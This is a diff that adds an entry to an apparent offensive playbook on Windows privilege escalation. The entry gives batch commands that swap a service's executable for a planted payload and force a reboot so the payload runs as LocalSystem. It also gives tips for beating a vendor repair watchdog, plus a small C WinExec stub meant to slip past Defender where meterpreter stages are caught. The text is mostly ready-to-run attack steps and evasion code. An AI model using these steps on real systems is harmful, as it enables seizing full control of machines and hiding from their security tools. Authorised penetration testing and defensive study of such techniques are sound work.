@@ -304,3 +304,24 @@ token can still enumerate the filesystem - a heavily-restricted service token ma
 from an earlier user in the chain if the escalated one returns nothing.
 
 <!-- promoted-slug: win-accesschk-writable-file-sweep -->
+
+## Service binary hijack when you cannot start/stop the service (reboot trigger + watchdog race)
+
+Beyond the standard writable-binary swap (`copy` + `sc stop`/`sc start`): when the compromised account cannot control the service but holds SeShutdownPrivilege (common for web/service accounts), trigger execution with a reboot instead, the AUTO_START service runs the planted binary as LocalSystem at boot.
+
+```bat
+ren "C:\Program Files (x86)\<vendor>\<app>\svc.exe" svc.exe.bak
+copy C:\Windows\temp\p.exe "C:\Program Files (x86)\<vendor>\<app>\svc.exe"
+shutdown /r /t 3 /f
+```
+
+Gotchas:
+- A vendor repair watchdog can revert the swap before the reboot completes (tells: SCM "service failed to start" event plus your small stub replaced by a larger `.old` artifact). Fix: re-arm the swap and issue the reboot in the SAME action; the watchdog is not alive post-reboot.
+- If Defender reaps meterpreter stages within ~30s of connect, a ~7KB mingw `WinExec` stub that only launches a batch file passes untouched, and the batch file carries the SYSTEM-context actions:
+
+```c
+#include <windows.h>
+int main(void){ WinExec("cmd /c C:\\Windows\\temp\\p.bat", 0); return 0; }
+```
+
+<!-- promoted-slug: service-binary-hijack-reboot-watchdog -->
